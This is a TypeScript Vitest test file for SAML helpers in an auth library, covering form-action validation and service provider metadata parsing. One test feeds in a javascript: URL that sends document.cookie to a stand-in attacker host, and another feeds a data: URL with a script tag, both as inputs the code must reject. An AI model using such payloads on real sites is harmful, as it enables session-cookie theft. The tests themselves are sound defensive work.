import { APIError } from "better-auth/api";
import { describe, expect, it } from "vitest";
import type { SAMLConfig } from "../types";
import {
	createSAMLPostForm,
	createSP,
	deriveSAMLIdentityProviderEntityID,
	deriveSAMLServiceProviderPolicy,
} from "./helpers";

const invalidSAMLBindingLocationMessage =
	"SAML POST binding location must be an absolute http or https URL";

function expectInvalidSAMLBindingLocation(action: string) {
	try {
		createSAMLPostForm(action, "SAMLResponse", "base64value");
		expect.unreachable();
	} catch (error) {
		expect(error).toBeInstanceOf(APIError);
		expect(error).toMatchObject({
			status: "BAD_REQUEST",
			statusCode: 400,
			message: invalidSAMLBindingLocationMessage,
			body: {
				message: invalidSAMLBindingLocationMessage,
			},
		});
	}
}

function expectInvalidSAMLServiceProviderMetadata(operation: () => unknown) {
	try {
		operation();
		expect.unreachable();
	} catch (error) {
		expect(error).toBeInstanceOf(APIError);
		expect(error).toMatchObject({
			status: "BAD_REQUEST",
			body: {
				code: "SAML_INVALID_SP_METADATA",
				message: "Invalid SAML service provider metadata",
			},
		});
	}
}

describe("createSAMLPostForm", () => {
	it("emits an http(s) form action", async () => {
		const res = createSAMLPostForm(
			"https://idp.example.com/slo",
			"SAMLResponse",
			"base64value",
		);
		const html = await res.text();
		expect(html).toContain('action="https://idp.example.com/slo"');
	});

	it("rejects a javascript: form action", () => {
		expectInvalidSAMLBindingLocation(
			"javascript:fetch('https://evil.test/x?c='+document.cookie)",
		);
	});

	it("rejects a data: form action", () => {
		expectInvalidSAMLBindingLocation("data:text/html,<script>1</script>");
	});
});

describe("deriveSAMLIdentityProviderEntityID", () => {
	it("returns the declared entity ID from manual IdP configuration", () => {
		const configuration = {
			issuer: "https://service.example.com/saml",
			entryPoint: "https://idp.example.com/sso",
			cert: "placeholder-signing-certificate",
			idpMetadata: {
				entityID: "https://idp.example.com/metadata",
			},
		} satisfies SAMLConfig;

		expect(deriveSAMLIdentityProviderEntityID(configuration)).toBe(
			"https://idp.example.com/metadata",
		);
	});

	it("returns the entity ID parsed from IdP metadata", () => {
		const configuration = {
			issuer: "https://service.example.com/saml",
			entryPoint: "https://ignored.example.com/sso",
			idpMetadata: {
				metadata: `
					<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://metadata-idp.example.com">
						<IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
							<SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://metadata-idp.example.com/sso" />
						</IDPSSODescriptor>
					</EntityDescriptor>
				`,
			},
		} satisfies SAMLConfig;

		expect(deriveSAMLIdentityProviderEntityID(configuration)).toBe(
			"https://metadata-idp.example.com",
		);
	});
});

describe("createSP assertion-signing metadata", () => {
	const configuration = {
		issuer: "https://service.example.com/saml",
		entryPoint: "https://idp.example.com/sso",
		idpMetadata: { entityID: "https://idp.example.com/metadata" },
		wantAssertionsSigned: true,
	} satisfies SAMLConfig;

	it("advertises signed assertions in generated metadata", () => {
		const provider = createSP(
			configuration,
			"https://service.example.com/api/auth",
			"workforce",
		);
		expect(provider.getMetadata()).toContain('WantAssertionsSigned="true"');
	});

	it("accepts custom metadata that requires signed assertions", () => {
		expect(() =>
			createSP(
				{
					...configuration,
					spMetadata: {
						metadata: `
								<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
									<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
										<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
									</SPSSODescriptor>
								</EntityDescriptor>
							`,
					},
				},
				"https://service.example.com/api/auth",
				"workforce",
			),
		).not.toThrow();
		expect(
			deriveSAMLServiceProviderPolicy({
				wantAssertionsSigned: false,
				spMetadata: {
					metadata: `
							<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
								<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
									<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
								</SPSSODescriptor>
							</EntityDescriptor>
						`,
				},
			}),
		).toEqual({ wantAssertionsSigned: true });
	});

	it.each([
		[
			"has no entity ID",
			`
				<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata">
					<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
						<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
					</SPSSODescriptor>
				</EntityDescriptor>
			`,
		],
		[
			"has no POST assertion consumer service",
			`
				<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
					<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol" />
				</EntityDescriptor>
			`,
		],
		[
			"has only a Redirect assertion consumer service",
			`
				<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
					<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
						<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://service.example.com/saml/acs" />
					</SPSSODescriptor>
				</EntityDescriptor>
			`,
		],
		[
			"has a relative POST assertion consumer service",
			`
				<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
					<SPSSODescriptor WantAssertionsSigned="true" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
						<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="/saml/acs" />
					</SPSSODescriptor>
				</EntityDescriptor>
			`,
		],
	])("rejects custom metadata that %s", (_description, metadata) => {
		expect(() =>
			deriveSAMLServiceProviderPolicy({
				wantAssertionsSigned: false,
				spMetadata: { metadata },
			}),
		).toThrow("Invalid SAML service provider metadata");
	});

	it("rejects custom metadata that contradicts the signed-assertion policy", () => {
		expect(() =>
			createSP(
				{
					...configuration,
					spMetadata: {
						metadata: `
								<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
									<SPSSODescriptor WantAssertionsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
										<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
									</SPSSODescriptor>
								</EntityDescriptor>
							`,
					},
				},
				"https://service.example.com/api/auth",
				"workforce",
			),
		).toThrow("must require signed assertions");
	});

	it("does not treat a misleading comment as signed-assertion policy", () => {
		expect(() =>
			createSP(
				{
					...configuration,
					spMetadata: {
						metadata: `
								<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
									<!-- <SPSSODescriptor WantAssertionsSigned="true" /> -->
									<SPSSODescriptor WantAssertionsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
										<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
									</SPSSODescriptor>
								</EntityDescriptor>
							`,
					},
				},
				"https://service.example.com/api/auth",
				"workforce",
			),
		).toThrow("must require signed assertions");
	});

	it("rejects a foreign descriptor mixed with valid SP metadata", () => {
		expectInvalidSAMLServiceProviderMetadata(() =>
			createSP(
				{
					...configuration,
					spMetadata: {
						metadata: `
							<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
								<foreign:SPSSODescriptor xmlns:foreign="urn:example:foreign" WantAssertionsSigned="true" />
								<SPSSODescriptor WantAssertionsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
									<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
								</SPSSODescriptor>
							</EntityDescriptor>
						`,
					},
				},
				"https://service.example.com/api/auth",
				"workforce",
			),
		);
	});

	it("accepts XML Schema numeric true for WantAssertionsSigned", () => {
		const metadata = `
			<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
				<SPSSODescriptor WantAssertionsSigned="1" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
					<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
				</SPSSODescriptor>
			</EntityDescriptor>
		`;
		expect(() =>
			createSP(
				{
					...configuration,
					spMetadata: { metadata },
				},
				"https://service.example.com/api/auth",
				"workforce",
			),
		).not.toThrow();
		expect(
			deriveSAMLServiceProviderPolicy({
				wantAssertionsSigned: false,
				spMetadata: { metadata },
			}),
		).toEqual({ wantAssertionsSigned: true });
	});

	it("accepts XML Schema numeric false for WantAssertionsSigned", () => {
		const metadata = `
			<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
				<SPSSODescriptor WantAssertionsSigned="0" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
					<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
				</SPSSODescriptor>
			</EntityDescriptor>
		`;

		expect(
			deriveSAMLServiceProviderPolicy({
				wantAssertionsSigned: false,
				spMetadata: { metadata },
			}),
		).toEqual({ wantAssertionsSigned: false });
	});

	it("rejects an invalid WantAssertionsSigned lexical value", () => {
		expect(() =>
			deriveSAMLServiceProviderPolicy({
				wantAssertionsSigned: false,
				spMetadata: {
					metadata: `
						<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://service.example.com/saml">
							<SPSSODescriptor WantAssertionsSigned="TRUE" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
								<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://service.example.com/saml/acs" />
							</SPSSODescriptor>
						</EntityDescriptor>
					`,
				},
			}),
		).toThrow("Invalid SAML service provider metadata");
	});

	it("rejects malformed custom metadata even when signed assertions are not configured", () => {
		expect(() =>
			createSP(
				{
					...configuration,
					wantAssertionsSigned: false,
					spMetadata: {
						metadata: "<EntityDescriptor><SPSSODescriptor>",
					},
				},
				"https://service.example.com/api/auth",
				"workforce",
			),
		).toThrow("Invalid SAML service provider metadata");
	});
});
